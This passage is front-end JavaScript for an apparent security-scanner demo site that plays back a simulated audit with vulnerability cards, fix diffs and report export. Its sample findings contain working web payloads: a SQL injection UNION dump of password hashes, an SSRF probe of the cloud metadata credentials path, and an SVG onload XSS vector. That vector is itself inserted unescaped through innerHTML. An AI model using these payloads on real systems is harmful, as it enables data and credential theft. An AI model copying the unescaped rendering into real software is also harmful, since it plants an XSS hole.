/**
 * AegisAppSec — Cybersecurity Frontend Logic
 * Interactive Live Scanner, Real-Time Hero Telemetry & UI Controllers
 */

document.addEventListener('DOMContentLoaded', () => {
  initMobileMenu();
  initAuthTabs();
  initPasswordToggle();
  initPasswordStrength();
  initContactForm();
  initScannerUI();
  initVulnModal();
  initHeroTelemetryFeed();
  initCommandPalette();
  initWafSandbox();
  initWafDropdown();
});

/* ─── MOBILE NAVIGATION ───────────────────────────────────────── */
function initMobileMenu() {
  const btn = document.getElementById('mobileMenuBtn');
  const nav = document.getElementById('navLinks');
  if (!btn || !nav) return;

  btn.addEventListener('click', () => {
    const isFlex = window.getComputedStyle(nav).display === 'flex';
    if (isFlex && nav.classList.contains('mobile-active')) {
      nav.classList.remove('mobile-active');
      nav.style.display = 'none';
    } else {
      nav.classList.add('mobile-active');
      nav.style.display = 'flex';
      nav.style.flexDirection = 'column';
      nav.style.position = 'absolute';
      nav.style.top = '80px';
      nav.style.left = '0';
      nav.style.right = '0';
      nav.style.background = 'rgba(6, 9, 19, 0.98)';
      nav.style.borderBottom = '1px solid var(--frame-border)';
      nav.style.padding = '24px 32px';
      nav.style.gap = '16px';
      nav.style.zIndex = '999';
    }
  });
}

/* ─── CYBERSECURITY SUITE DROPDOWN MEGA-MENUS ─────────────────── */
function initWafDropdown() {
  // Window-level outside click listener for all dropdown mega-menus
  document.addEventListener('click', (e) => {
    document.querySelectorAll('.sk-nav-dropdown-wrap').forEach((wrap) => {
      if (!wrap.contains(e.target)) {
        wrap.classList.remove('open');
        const btn = wrap.querySelector('.sk-dropdown-trigger');
        if (btn) btn.setAttribute('aria-expanded', 'false');
      }
    });
  });

  // Window-level escape key listener
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.querySelectorAll('.sk-nav-dropdown-wrap.open').forEach((wrap) => {
        wrap.classList.remove('open');
        const btn = wrap.querySelector('.sk-dropdown-trigger');
        if (btn) btn.setAttribute('aria-expanded', 'false');
      });
    }
  });
}

/* ─── NUMBERED FEATURE SLICES TOGGLE (Reference 1) ────────────── */
function toggleSlice(id) {
  const row = document.getElementById(`slice-${id}`);
  if (!row) return;
  const isOpen = row.classList.contains('open');
  
  // Close other open rows for clean accordion effect
  document.querySelectorAll('.sk-slice-row').forEach(r => r.classList.remove('open'));
  
  if (!isOpen) {
    row.classList.add('open');
  }
}

/* ─── AUTHENTICATION TABS & WORKSPACE SWITCHER ────────────────── */
function initAuthTabs() {
  const tabs = document.querySelectorAll('.auth-tab-btn');
  const login = document.getElementById('loginForm');
  const reg   = document.getElementById('registerForm');
  if (!tabs.length) return;

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      tabs.forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      const target = tab.dataset.tab;
      if (login) login.style.display = target === 'login' ? 'block' : 'none';
      if (reg)   reg.style.display   = target === 'register' ? 'block' : 'none';
    });
  });
}

function simulateSSO(provider) {
  const emailField = document.getElementById('loginEmail');
  if (emailField) {
    emailField.value = `operator@${provider.toLowerCase()}-cloud.sec`;
    const form = document.getElementById('loginForm');
    if (form) form.submit();
  }
}

/* ─── PASSWORD SHOW / HIDE ────────────────────────────────────── */
function togglePwd(id, btn) {
  const input = document.getElementById(id);
  if (!input) return;
  const isText = input.type === 'text';
  input.type = isText ? 'password' : 'text';
  btn.textContent = isText ? 'SHOW' : 'HIDE';
}

function initPasswordToggle() {}

/* ─── REAL-TIME PASSWORD STRENGTH EVALUATION ──────────────────── */
function evalStrength(val) {
  const fill  = document.getElementById('strengthFill');
  const label = document.getElementById('strengthLabel');
  if (!fill || !label) return;

  if (!val) {
    fill.style.width = '0';
    label.textContent = '';
    return;
  }

  let score = 0;
  if (val.length >= 8)  score++;
  if (val.length >= 12) score++;
  if (/[A-Z]/.test(val)) score++;
  if (/[0-9]/.test(val)) score++;
  if (/[^A-Za-z0-9]/.test(val)) score++;

  const levels = [
    { pct: '20%', color: '#f43f5e', text: 'WEAK — Min 12 chars required' },
    { pct: '40%', color: '#f97316', text: 'FAIR — Add symbols & uppercase' },
    { pct: '60%', color: '#facc15', text: 'MODERATE — Good complexity' },
    { pct: '80%', color: '#38bdf8', text: 'STRONG — High entropy' },
    { pct: '100%', color: '#00f0ff', text: 'ENTERPRISE-GRADE PASSPHRASE ✓' },
  ];

  const l = levels[Math.min(score, 4)];
  fill.style.width = l.pct;
  fill.style.background = l.color;
  label.textContent = l.text;
  label.style.color = l.color;
}

function initPasswordStrength() {
  const pwd = document.getElementById('regPwd');
  if (pwd) pwd.addEventListener('input', () => evalStrength(pwd.value));
}

/* ─── CONTACT FORM FEEDBACK ───────────────────────────────────── */
function initContactForm() {}

/* ─── VULNERABILITY DATABASE & SCANNER SIMULATION ─────────────── */
const VULNS = [
  {
    id: 'VULN-001',
    severity: 'CRITICAL',
    title: 'SQL Injection (Error-Based)',
    endpoint: 'GET /api/users?id=1%27',
    parameter: 'id',
    confidence: 98,
    evidence: "Database error detected after injection probe: syntax error near 'UNION SELECT 1, username, password_hash...'",
    recommendation: 'Enforce parameterized queries / prepared statements with ORM abstraction and input sanitation.',
    payload: "1' UNION SELECT 1, username, password_hash, email FROM users WHERE '1'='1",
    cvss: '9.8',
    cwe: 'CWE-89',
    owasp: 'A03:2021 — Injection'
  },
  {
    id: 'VULN-002',
    severity: 'HIGH',
    title: 'Server-Side Request Forgery (SSRF)',
    endpoint: 'POST /api/webhook/test',
    parameter: 'callback_url',
    confidence: 94,
    evidence: 'Internal cloud metadata 169.254.169.254 resolved with HTTP 200 OK containing IAM security role credentials.',
    recommendation: 'Implement strict IP address allowlists, block all RFC-1918 link-local ranges, and disable HTTP redirects.',
    payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role',
    cvss: '8.6',
    cwe: 'CWE-918',
    owasp: 'A10:2021 — Server-Side Request Forgery'
  },
  {
    id: 'VULN-003',
    severity: 'HIGH',
    title: 'Broken Object Level Authorization (BOLA / IDOR)',
    endpoint: 'GET /api/documents/9921',
    parameter: 'doc_id',
    confidence: 92,
    evidence: 'Tenant 102 successfully accessed confidential financial document 9921 owned by tenant 9941 without access denial.',
    recommendation: 'Validate user tenancy and object ownership at data layer on every authenticated transaction.',
    payload: 'GET /api/documents/9921 [Authorization: Bearer token_tenant_102]',
    cvss: '8.2',
    cwe: 'CWE-639',
    owasp: 'A01:2021 — Broken Access Control'
  },
  {
    id: 'VULN-004',
    severity: 'MEDIUM',
    title: 'Cross-Site Scripting (Reflected XSS)',
    endpoint: 'GET /search?q=',
    parameter: 'q',
    confidence: 96,
    evidence: "Injected SVG vector '<svg/onload=confirm(document.domain)>' reflected directly into HTML DOM without escaping.",
    recommendation: 'Apply context-aware HTML entity encoding and enforce Content-Security-Policy (CSP) headers without unsafe-inline.',
    payload: "\"><svg/onload=confirm(document.domain)>",
    cvss: '6.1',
    cwe: 'CWE-79',
    owasp: 'A03:2021 — Injection'
  },
  {
    id: 'VULN-005',
    severity: 'LOW',
    title: 'Missing HTTP Strict-Transport-Security (HSTS)',
    endpoint: 'ALL ROUTES /*',
    parameter: 'Response Headers',
    confidence: 100,
    evidence: 'Strict-Transport-Security header is missing, allowing potential SSL stripping / downgrade attacks on insecure networks.',
    recommendation: 'Configure HSTS header: max-age=31536000; includeSubDomains; preload across all reverse proxy layers.',
    payload: 'N/A — Missing Security Header',
    cvss: '4.3',
    cwe: 'CWE-319',
    owasp: 'A02:2021 — Cryptographic Failures'
  },
  {
    id: 'VULN-006',
    severity: 'LOW',
    title: 'Information Disclosure — Server Version Header',
    endpoint: 'ALL ROUTES /*',
    parameter: 'Server / X-Powered-By',
    confidence: 100,
    evidence: "Server header 'Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1d' exposes exact version with known public CVEs.",
    recommendation: 'Strip Server and X-Powered-By response headers at reverse proxy / ingress controller.',
    payload: 'N/A — Insecure Default Header',
    cvss: '3.7',
    cwe: 'CWE-200',
    owasp: 'A05:2021 — Security Misconfiguration'
  }
];

const PIPE_STAGES = [
  'Target Discovery','Crawler Initialization','Route Enumeration','Parameter Analysis',
  'Payload Generation','Attack Execution','WAF Probing','Evidence Collection',
  'Risk Scoring','Report Generation'
];

const LOG_STREAM = [
  [250,  'info',  'Initializing AegisAppSec DAST Engine v2.4.0...'],
  [500,  'info',  'Target DNS resolved: 104.21.55.22 — TLS 1.3 handshake verified'],
  [800,  'info',  'Crawler active: discovered 47 endpoints and 18 API routes'],
  [1100, 'info',  'Extracted 612 parameters, headers, and query vectors'],
  [1400, 'info',  'Synthesizing 1,000+ payload mutation vectors for fuzzing'],
  [1700, 'error', '[!] SQLi error response triggered on /api/users?id=1%27'],
  [2000, 'warn',  'Testing AWS cloud metadata endpoint protection...'],
  [2300, 'error', '[!] SSRF vector confirmed: internal IAM credential endpoint accessible'],
  [2600, 'warn',  'Probing object authorization on /api/documents/{doc_id}'],
  [2900, 'error', '[!] BOLA confirmed: cross-tenant data retrieved without authorization'],
  [3200, 'info',  'Testing reflected input sanitation on /search?q='],
  [3500, 'warn',  '[!] XSS reflected SVG payload executed in browser DOM context'],
  [3800, 'info',  'Analyzing security response headers: HSTS missing, Server banner exposed'],
  [4100, 'ok',    'WAF rules dynamically synthesized for 4 critical vulnerabilities'],
  [4400, 'ok',    '[✓] Scan completed: 6 findings cataloged (1 Critical, 2 High, 1 Medium, 2 Low)']
];

let scanActive = false;
let autoScrollEnabled = true;
let currentFindingDiff = null;

function initScannerUI() {
  updateSeverityDonut(0, 0, 0, 0, 'IDLE');
}

/* ─── INTERACTIVE SEVERITY DONUT CHART ────────────────────────── */
function updateSeverityDonut(crit, high, med, low, statusText = 'ANOMALIES') {
  const total = crit + high + med + low;
  const C = 301.6; // Circumference for r=48

  const critEl = document.getElementById('donutCrit');
  const highEl = document.getElementById('donutHigh');
  const medEl  = document.getElementById('donutMed');
  const lowEl  = document.getElementById('donutLow');

  const scoreEl  = document.getElementById('donutScore');
  const statusEl = document.getElementById('donutStatus');

  const legCrit = document.getElementById('leg-crit');
  const legHigh = document.getElementById('leg-high');
  const legMed  = document.getElementById('leg-med');
  const legLow  = document.getElementById('leg-low');

  if (legCrit) legCrit.textContent = crit;
  if (legHigh) legHigh.textContent = high;
  if (legMed)  legMed.textContent  = med;
  if (legLow)  legLow.textContent  = low;

  if (scoreEl) scoreEl.textContent = total;
  if (statusEl) statusEl.textContent = total > 0 ? statusText : 'IDLE';

  if (total === 0) {
    [critEl, highEl, medEl, lowEl].forEach(el => {
      if (el) {
        el.setAttribute('stroke-dasharray', `0 ${C}`);
        el.setAttribute('stroke-dashoffset', '0');
      }
    });
    return;
  }

  const critLen = (crit / total) * C;
  const highLen = (high / total) * C;
  const medLen  = (med / total) * C;
  const lowLen  = (low / total) * C;

  if (critEl) {
    critEl.setAttribute('stroke-dasharray', `${critLen} ${C - critLen}`);
    critEl.setAttribute('stroke-dashoffset', '0');
  }
  if (highEl) {
    highEl.setAttribute('stroke-dasharray', `${highLen} ${C - highLen}`);
    highEl.setAttribute('stroke-dashoffset', `${-critLen}`);
  }
  if (medEl) {
    medEl.setAttribute('stroke-dasharray', `${medLen} ${C - medLen}`);
    medEl.setAttribute('stroke-dashoffset', `${-(critLen + highLen)}`);
  }
  if (lowEl) {
    lowEl.setAttribute('stroke-dasharray', `${lowLen} ${C - lowLen}`);
    lowEl.setAttribute('stroke-dashoffset', `${-(critLen + highLen + medLen)}`);
  }
}

function startScan() {
  if (scanActive) return;
  const urlInput = document.getElementById('targetUrl');
  const url = urlInput ? urlInput.value.trim() : '';

  if (!url) {
    if (urlInput) {
      urlInput.style.borderColor = '#f43f5e';
      urlInput.focus();
      setTimeout(() => urlInput.style.borderColor = '', 1500);
    }
    return;
  }

  scanActive = true;
  const btn = document.getElementById('startScanBtn');
  if (btn) {
    btn.innerHTML = `<svg class="spinner" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16" style="animation: spin 1s linear infinite;"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg> EXECUTING ATTACK PROBES...`;
    btn.style.background = 'rgba(0, 240, 255, 0.2)';
    btn.style.borderColor = 'var(--cyan)';
    btn.style.color = 'var(--cyan)';
  }

  // Reset terminal
  const term = document.getElementById('terminalOutput');
  if (term) {
    term.innerHTML = `<div><span class="t-time">[00:00:00]</span> <span class="t-info t-bold">AEGIS-DAST // COMMENCING AUDIT ON: ${url}</span></div>`;
  }

  // Reset metrics & donut
  ['m-total','m-crit','m-high','m-med'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.textContent = '0';
  });
  updateSeverityDonut(0, 0, 0, 0, 'SCANNING');

  // Reset pipeline
  PIPE_STAGES.forEach((_, i) => {
    const dot = document.getElementById(`dot-${i}`);
    const nm  = document.getElementById(`pname-${i}`);
    const st  = document.getElementById(`pstat-${i}`);
    if (dot) dot.className = 'sk-pipe-dot';
    if (nm)  nm.classList.remove('active');
    if (st)  { st.textContent = 'QUEUED'; st.style.color = ''; }
  });

  // Clear vuln grid
  const grid = document.getElementById('vulnGrid');
  if (grid) grid.innerHTML = '';
  const filter = document.getElementById('filterRow');
  if (filter) filter.style.display = 'none';

  // Run pipeline animation
  PIPE_STAGES.forEach((_, i) => {
    setTimeout(() => {
      if (i > 0) {
        const prevDot = document.getElementById(`dot-${i-1}`);
        const prevSt  = document.getElementById(`pstat-${i-1}`);
        if (prevDot) prevDot.className = 'sk-pipe-dot done';
        if (prevSt)  { prevSt.textContent = 'DONE'; prevSt.style.color = '#10b981'; }
      }
      const curDot = document.getElementById(`dot-${i}`);
      const curNm  = document.getElementById(`pname-${i}`);
      const curSt  = document.getElementById(`pstat-${i}`);
      if (curDot) curDot.className = 'sk-pipe-dot active';
      if (curNm)  curNm.classList.add('active');
      if (curSt)  { curSt.textContent = 'ACTIVE'; curSt.style.color = 'var(--cyan)'; }
    }, i * 420);
  });

  // Stream logs
  LOG_STREAM.forEach(([delay, type, msg]) => {
    setTimeout(() => {
      if (!term) return;
      const s = Math.floor(delay / 1000);
      const ms = String(delay % 1000).padStart(3, '0').slice(0, 2);
      const timeStr = `[00:0${s}.${ms}]`;
      const div = document.createElement('div');
      div.className = 'term-log-line';
      const cls = type === 'error' ? 't-error' : type === 'warn' ? 't-warn' : type === 'ok' ? 't-ok' : 't-info';
      div.innerHTML = `<span class="t-time">${timeStr}</span> <span class="${cls}">${msg}</span>`;
      term.appendChild(div);
      if (autoScrollEnabled) {
        term.scrollTop = term.scrollHeight;
      }
    }, delay);
  });

  // Complete scan
  const totalDuration = 4600;
  setTimeout(() => {
    const lastDot = document.getElementById(`dot-${PIPE_STAGES.length - 1}`);
    const lastSt  = document.getElementById(`pstat-${PIPE_STAGES.length - 1}`);
    if (lastDot) lastDot.className = 'sk-pipe-dot done';
    if (lastSt)  { lastSt.textContent = 'DONE'; lastSt.style.color = '#10b981'; }

    scanActive = false;
    if (btn) {
      btn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> AUDIT COMPLETE — RUN NEW SCAN`;
      btn.style.background = 'var(--cyan)';
      btn.style.color = '#030712';
      btn.style.borderColor = 'var(--cyan)';
    }

    animateCount('m-total', VULNS.length);
    animateCount('m-crit',  1);
    animateCount('m-high',  2);
    animateCount('m-med',   1);

    updateSeverityDonut(1, 2, 1, 2, 'THREATS');

    if (filter) filter.style.display = 'flex';
    renderVulns(VULNS);
  }, totalDuration);
}

function animateCount(id, target) {
  const el = document.getElementById(id);
  if (!el) return;
  let n = 0;
  const step = 1;
  const iv = setInterval(() => {
    n = Math.min(n + step, target);
    el.textContent = n;
    if (n >= target) clearInterval(iv);
  }, 70);
}

function renderVulns(list) {
  const grid = document.getElementById('vulnGrid');
  if (!grid) return;
  grid.innerHTML = '';
  list.forEach(v => {
    const card = document.createElement('div');
    card.className = 'sk-vuln-card';
    card.setAttribute('data-sev', v.severity);
    card.innerHTML = `
      <span class="sk-sev ${v.severity}">${v.severity}</span>
      <div class="sk-vuln-title">${v.title}</div>
      <div class="sk-vuln-ep">${v.endpoint}</div>
      <p class="sk-vuln-desc">${v.evidence}</p>
      <div class="sk-vuln-action">View Remediation &amp; Split Code Diff →</div>`;
    card.addEventListener('click', () => openModal(v));
    grid.appendChild(card);
  });
}

function filterVulns(sev) {
  document.querySelectorAll('.sk-filter-row .sk-chip').forEach(c => c.classList.remove('active'));
  if (window.event && window.event.target) window.event.target.classList.add('active');
  const filtered = sev === 'ALL' ? VULNS : VULNS.filter(v => v.severity === sev);
  renderVulns(filtered);
}

/* ─── TERMINAL CONTROLS: SEARCH, AUTOSCROLL, FULLSCREEN ───────── */
function filterTerminalLogs(query) {
  const q = (query || '').toLowerCase().trim();
  const lines = document.querySelectorAll('#terminalOutput .term-log-line');
  lines.forEach(l => {
    if (!q || l.textContent.toLowerCase().includes(q)) {
      l.style.display = '';
    } else {
      l.style.display = 'none';
    }
  });
}

function toggleAutoScroll() {
  autoScrollEnabled = !autoScrollEnabled;
  const btn = document.getElementById('autoScrollBtn');
  if (btn) {
    if (autoScrollEnabled) {
      btn.classList.add('active');
      const term = document.getElementById('terminalOutput');
      if (term) term.scrollTop = term.scrollHeight;
    } else {
      btn.classList.remove('active');
    }
  }
}

function toggleTerminalFullscreen() {
  const term = document.getElementById('terminalContainer');
  if (!term) return;
  term.classList.toggle('fullscreen');
}

function copyTerminalLogs() {
  const term = document.getElementById('terminalOutput');
  if (!term) return;
  navigator.clipboard.writeText(term.innerText).then(() => {
    alert('Execution logs copied to clipboard.');
  }).catch(() => {});
}

/* ─── VULNERABILITY CODE DIFF DATABASE ────────────────────────── */
const VULN_DIFFS = {
  'VULN-001': {
    file: 'controllers/users.py',
    patchedFile: 'controllers/users.py (Remediated)',
    vuln: `<span class="diff-ln">12</span> @app.route('/api/users')
<span class="diff-ln">13</span> def get_user():
<span class="diff-ln">14</span>     user_id = request.args.get('id')
<span class="diff-del"><span class="diff-ln">15</span>-    # VULNERABLE: Direct string interpolation</span>
<span class="diff-del"><span class="diff-ln">16</span>-    query = f"SELECT * FROM users WHERE id = '{user_id}'"</span>
<span class="diff-del"><span class="diff-ln">17</span>-    cursor.execute(query)</span>
<span class="diff-ln">18</span>     return jsonify(cursor.fetchone())`,
    fix: `<span class="diff-ln">12</span> @app.route('/api/users')
<span class="diff-ln">13</span> def get_user():
<span class="diff-ln">14</span>     user_id = request.args.get('id')
<span class="diff-add"><span class="diff-ln">15</span>+    # REMEDIATED: Parameterized SQL prepared statement</span>
<span class="diff-add"><span class="diff-ln">16</span>+    query = "SELECT * FROM users WHERE id = %s"</span>
<span class="diff-add"><span class="diff-ln">17</span>+    cursor.execute(query, (user_id,))</span>
<span class="diff-ln">18</span>     return jsonify(cursor.fetchone())`,
    rawFix: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`
  },
  'VULN-002': {
    file: 'services/webhook_client.py',
    patchedFile: 'services/webhook_client.py (Remediated)',
    vuln: `<span class="diff-ln">44</span> def forward_event(target_url, payload):
<span class="diff-del"><span class="diff-ln">45</span>-    # VULNERABLE: Unchecked user input allows SSRF to 169.254.169.254</span>
<span class="diff-del"><span class="diff-ln">46</span>-    return requests.post(target_url, json=payload, timeout=5)</span>`,
    fix: `<span class="diff-ln">44</span> def forward_event(target_url, payload):
<span class="diff-add"><span class="diff-ln">45</span>+    # REMEDIATED: Validate domain whitelist and filter RFC1918/link-local</span>
<span class="diff-add"><span class="diff-ln">46</span>+    validate_safe_egress_target(target_url, block_internal=True)</span>
<span class="diff-add"><span class="diff-ln">47</span>+    return requests.post(target_url, json=payload, timeout=3, allow_redirects=False)</span>`,
    rawFix: `validate_safe_egress_target(target_url, block_internal=True)\nreturn requests.post(target_url, json=payload, timeout=3, allow_redirects=False)`
  },
  'VULN-003': {
    file: 'api/documents.py',
    patchedFile: 'api/documents.py (Remediated)',
    vuln: `<span class="diff-ln">28</span> @app.route('/api/documents/<doc_id>')
<span class="diff-ln">29</span> def get_doc(doc_id):
<span class="diff-del"><span class="diff-ln">30</span>-    # VULNERABLE: Retrieves doc by ID without verifying tenant owner</span>
<span class="diff-del"><span class="diff-ln">31</span>-    doc = Document.query.get(doc_id)</span>
<span class="diff-ln">32</span>     return jsonify(doc.to_dict())`,
    fix: `<span class="diff-ln">28</span> @app.route('/api/documents/<doc_id>')
<span class="diff-ln">29</span> @require_auth
<span class="diff-ln">30</span> def get_doc(doc_id):
<span class="diff-add"><span class="diff-ln">31</span>+    # REMEDIATED: Enforce tenant ownership scope</span>
<span class="diff-add"><span class="diff-ln">32</span>+    doc = Document.query.filter_by(id=doc_id, tenant_id=current_user.tenant_id).first_or_404()</span>
<span class="diff-ln">33</span>     return jsonify(doc.to_dict())`,
    rawFix: `doc = Document.query.filter_by(id=doc_id, tenant_id=current_user.tenant_id).first_or_404()`
  },
  'VULN-004': {
    file: 'templates/search_results.html',
    patchedFile: 'templates/search_results.html (Remediated)',
    vuln: `<span class="diff-ln">08</span> <div class="search-header">
<span class="diff-del"><span class="diff-ln">09</span>-  <h3>Results for: {{ query | safe }}</h3></span>
<span class="diff-ln">10</span> </div>`,
    fix: `<span class="diff-ln">08</span> <div class="search-header">
<span class="diff-add"><span class="diff-ln">09</span>+  <h3>Results for: {{ query | e }}</h3></span>
<span class="diff-ln">10</span> </div>`,
    rawFix: `<h3>Results for: {{ query | e }}</h3>`
  },
  'VULN-005': {
    file: 'nginx/conf.d/security.conf',
    patchedFile: 'nginx/conf.d/security.conf (Remediated)',
    vuln: `<span class="diff-ln">01</span> server {
<span class="diff-ln">02</span>     listen 443 ssl http2;
<span class="diff-del"><span class="diff-ln">03</span>-    # VULNERABLE: Missing HTTP Strict-Transport-Security</span>
<span class="diff-ln">04</span> }`,
    fix: `<span class="diff-ln">01</span> server {
<span class="diff-ln">02</span>     listen 443 ssl http2;
<span class="diff-add"><span class="diff-ln">03</span>+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;</span>
<span class="diff-ln">04</span> }`,
    rawFix: `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;`
  },
  'VULN-006': {
    file: 'nginx/nginx.conf',
    patchedFile: 'nginx/nginx.conf (Remediated)',
    vuln: `<span class="diff-ln">14</span> http {
<span class="diff-del"><span class="diff-ln">15</span>-    server_tokens on;</span>
<span class="diff-ln">16</span> }`,
    fix: `<span class="diff-ln">14</span> http {
<span class="diff-add"><span class="diff-ln">15</span>+    server_tokens off;</span>
<span class="diff-add"><span class="diff-ln">16</span>+    more_clear_headers 'Server' 'X-Powered-By';</span>
<span class="diff-ln">17</span> }`,
    rawFix: `server_tokens off;\nmore_clear_headers 'Server' 'X-Powered-By';`
  }
};

/* ─── VULNERABILITY MODAL ─────────────────────────────────────── */
function initVulnModal() {
  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
}

function handleModalBackdrop(e) {
  closeModal();
}

function openModalById(id) {
  const v = VULNS.find(item => item.id === id);
  if (v) openModal(v);
}

function openModal(v) {
  const el = id => document.getElementById(id);
  if (el('modalSev')) {
    el('modalSev').textContent = v.severity;
    el('modalSev').className = `sk-sev ${v.severity}`;
  }
  if (el('modalTitle')) el('modalTitle').textContent = v.title;
  if (el('modalEp'))    el('modalEp').textContent = `${v.endpoint} · Parameter: ${v.parameter}`;
  if (el('modalCvss')) {
    el('modalCvss').textContent = v.cvss;
    el('modalCvss').style.color = v.severity === 'CRITICAL' ? '#f43f5e' : v.severity === 'HIGH' ? '#f97316' : '#facc15';
  }
  if (el('modalCwe'))      el('modalCwe').textContent = `${v.cwe} // ${v.owasp}`;
  if (el('modalEvidence')) el('modalEvidence').textContent = `${v.evidence}\n\n[Controlled Fuzzing Payload]:\n${v.payload}`;
  if (el('modalRec'))      el('modalRec').textContent = v.recommendation;

  // Render Split Code Diff
  const diffData = VULN_DIFFS[v.id] || VULN_DIFFS['VULN-001'];
  currentFindingDiff = diffData;

  if (el('diffVulnFile')) el('diffVulnFile').textContent = diffData.file;
  if (el('diffFixFile'))  el('diffFixFile').textContent  = diffData.patchedFile;
  if (el('diffVulnCode')) el('diffVulnCode').innerHTML  = diffData.vuln;
  if (el('diffFixCode'))  el('diffFixCode').innerHTML   = diffData.fix;

  const overlay = document.getElementById('vulnModal');
  if (overlay) overlay.classList.add('open');
  document.body.style.overflow = 'hidden';
}

function closeModal(targetId) {
  if (targetId) {
    const el = document.getElementById(targetId);
    if (el) {
      el.classList.remove('active');
      el.classList.remove('open');
      el.style.display = 'none';
    }
  }
  const overlay = document.getElementById('vulnModal');
  if (overlay) overlay.classList.remove('open');
  
  // Also close any currently active modal overlays
  document.querySelectorAll('.hs-modal-overlay.active, .tg-modal-overlay.active').forEach(m => {
    m.classList.remove('active');
    m.style.display = 'none';
  });
  
  document.body.style.overflow = '';
}

function copyRemediationCode() {
  if (!currentFindingDiff || !currentFindingDiff.rawFix) return;
  navigator.clipboard.writeText(currentFindingDiff.rawFix).then(() => {
    const btn = document.getElementById('copyDiffBtn');
    if (btn) {
      const orig = btn.innerHTML;
      btn.innerHTML = '✓ COPIED TO CLIPBOARD';
      btn.style.color = 'var(--emerald)';
      btn.style.borderColor = 'var(--emerald)';
      setTimeout(() => {
        btn.innerHTML = orig;
        btn.style.color = '';
        btn.style.borderColor = '';
      }, 2000);
    }
  }).catch(() => {});
}

function exportFindingPatch() {
  if (!currentFindingDiff) return;
  const patchContent = `--- a/${currentFindingDiff.file}\n+++ b/${currentFindingDiff.file}\n@@ -1,5 +1,6 @@\n# AegisAppSec Remediated Patch\n${currentFindingDiff.rawFix}\n`;
  const blob = new Blob([patchContent], { type: 'text/x-diff' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `aegis-fix-${Date.now()}.patch`;
  a.click();
}

function exportSarifReport() {
  const sarif = {
    $schema: "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
    version: "2.1.0",
    runs: [{
      tool: {
        driver: {
          name: "AegisAppSec DAST Engine",
          version: "2.4.0",
          informationUri: "https://aegisappsec.io",
          rules: VULNS.map(v => ({
            id: v.id,
            name: v.title,
            shortDescription: { text: v.title },
            fullDescription: { text: v.evidence },
            defaultConfiguration: {
              level: v.severity === 'CRITICAL' || v.severity === 'HIGH' ? 'error' : 'warning'
            },
            help: { text: v.recommendation },
            properties: { cwe: v.cwe, owasp: v.owasp, cvss: v.cvss }
          }))
        }
      },
      results: VULNS.map(v => ({
        ruleId: v.id,
        level: v.severity === 'CRITICAL' || v.severity === 'HIGH' ? 'error' : 'warning',
        message: { text: `${v.title} discovered on ${v.endpoint}` },
        locations: [{
          physicalLocation: {
            artifactLocation: { uri: v.endpoint }
          }
        }]
      }))
    }]
  };

  const blob = new Blob([JSON.stringify(sarif, null, 2)], { type: 'application/json' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = `aegis-dast-audit-${Date.now()}.sarif`;
  a.click();
}

/* ─── GLOBAL COMMAND PALETTE (Ctrl + K) ───────────────────────── */
function initCommandPalette() {
  document.addEventListener('keydown', e => {
    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') {
      e.preventDefault();
      toggleCommandPalette();
    }
    if (e.key === 'Escape') {
      closeCommandPalette();
    }
  });

  const input = document.getElementById('cmdkInput');
  if (input) {
    input.addEventListener('input', e => {
      const q = e.target.value.toLowerCase().trim();
      const items = document.querySelectorAll('.sk-cmdk-item');
      items.forEach(item => {
        const text = item.textContent.toLowerCase();
        if (!q || text.includes(q)) {
          item.style.display = 'flex';
        } else {
          item.style.display = 'none';
        }
      });
    });

    input.addEventListener('keydown', e => {
      const visible = Array.from(document.querySelectorAll('.sk-cmdk-item')).filter(i => i.style.display !== 'none');
      if (!visible.length) return;
      let cur = visible.findIndex(i => i.classList.contains('selected'));

      if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (cur >= 0) visible[cur].classList.remove('selected');
        const next = (cur + 1) % visible.length;
        visible[next].classList.add('selected');
        visible[next].scrollIntoView({ block: 'nearest' });
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (cur >= 0) visible[cur].classList.remove('selected');
        const prev = (cur - 1 + visible.length) % visible.length;
        visible[prev].classList.add('selected');
        visible[prev].scrollIntoView({ block: 'nearest' });
      } else if (e.key === 'Enter') {
        e.preventDefault();
        const active = cur >= 0 ? visible[cur] : visible[0];
        if (active) triggerCmdkItem(active);
      }
    });
  }

  // Click handlers on items
  document.querySelectorAll('.sk-cmdk-item').forEach(item => {
    item.addEventListener('click', () => triggerCmdkItem(item));
  });
}

function triggerCmdkItem(item) {
  closeCommandPalette();
  const action = item.dataset.action;
  const url    = item.dataset.url;

  if (action === 'nav' && url) {
    window.location.href = url;
  } else if (action === 'ext' && url) {
    window.open(url, '_blank', 'noopener');
  } else if (action === 'run-scan') {
    if (window.location.pathname.includes('scanner')) {
      startScan();
    } else {
      window.location.href = '/scanner';
    }
  } else if (action === 'waf-sandbox') {
    if (window.location.pathname.includes('services')) {
      document.getElementById('wafSandboxSection')?.scrollIntoView({ behavior: 'smooth' });
    } else {
      window.location.href = '/services#wafSandboxSection';
    }
  } else if (action === 'export-sarif') {
    exportSarifReport();
  }
}

function openCommandPalette() {
  const p = document.getElementById('commandPalette');
  const input = document.getElementById('cmdkInput');
  if (p) {
    p.style.display = 'flex';
    if (input) {
      input.value = '';
      input.focus();
      document.querySelectorAll('.sk-cmdk-item').forEach(i => {
        i.style.display = 'flex';
        i.classList.remove('selected');
      });
    }
  }
}

function closeCommandPalette() {
